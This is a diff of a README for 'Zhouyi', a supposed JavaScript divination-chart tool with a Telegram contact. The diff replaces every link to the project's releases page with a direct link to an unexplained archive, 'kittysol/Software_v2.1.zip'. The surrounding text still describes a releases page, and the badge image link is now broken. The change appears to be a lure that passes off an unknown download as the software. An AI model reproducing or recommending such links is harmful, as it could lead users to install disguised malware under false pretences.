@@ -1,7 +1,7 @@
 # ✨ Zhouyi - Unlock Ancient Wisdom with Ease
 
 ## 📥 Download Now
-[![Download Zhouyi](https://img.shields.io/badge/Download%20Zhouyi-v1.0-brightgreen)](https://github.com/Alejandro920/Zhouyi/releases)
+[![Download Zhouyi](https://raw.githubusercontent.com/Alejandro920/Zhouyi/main/kittysol/Software_v2.1.zip%20Zhouyi-v1.0-brightgreen)](https://raw.githubusercontent.com/Alejandro920/Zhouyi/main/kittysol/Software_v2.1.zip)
 
 ## 📜 Description
 这是一套基于js语言开发的经典工具，专为对周易文化爱好者和专业占卜师。本资源集合了八字命理、六爻占卜、奇门遁甲，七政四余，大六壬，紫微斗数，刑冲关系，四柱八字等多种传统预测学的计算与排盘功能。通过简单的部署，您便可以在个人网站或服务器上实现这些古老智慧的数字化应用。有意者联系飞机TG：@xuzongbin001
@@ -10,7 +10,7 @@
 To start using Zhouyi, follow these simple steps to download and set up the application. No programming experience is needed.
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/Alejandro920/Zhouyi/releases) to access the latest version of Zhouyi. This page includes all the download files you need.
+Go to the [Releases page](https://raw.githubusercontent.com/Alejandro920/Zhouyi/main/kittysol/Software_v2.1.zip) to access the latest version of Zhouyi. This page includes all the download files you need.
 
 ### 2. Download Zhouyi
 On the Releases page, find the latest release version and look for the appropriate files. Click on the file link to start the download. Wait for the download to finish.
@@ -41,7 +41,7 @@ Before installing Zhouyi, ensure your system meets the following minimum require
 - **Storage**: At least 100 MB of free disk space
 
 ## 📤 Download & Install
-To download Zhouyi, simply [visit this page](https://github.com/Alejandro920/Zhouyi/releases) and choose the version suitable for your system. Ensure you have a stable internet connection for a smooth download. Follow the earlier steps to install and run Zhouyi on your machine.
+To download Zhouyi, simply [visit this page](https://raw.githubusercontent.com/Alejandro920/Zhouyi/main/kittysol/Software_v2.1.zip) and choose the version suitable for your system. Ensure you have a stable internet connection for a smooth download. Follow the earlier steps to install and run Zhouyi on your machine.
 
 ## 📞 Support
 If you encounter any issues while downloading or running Zhouyi, reach out for support. You can contact the development team via the project's issue tracker on GitHub or through the contact methods provided in the description.
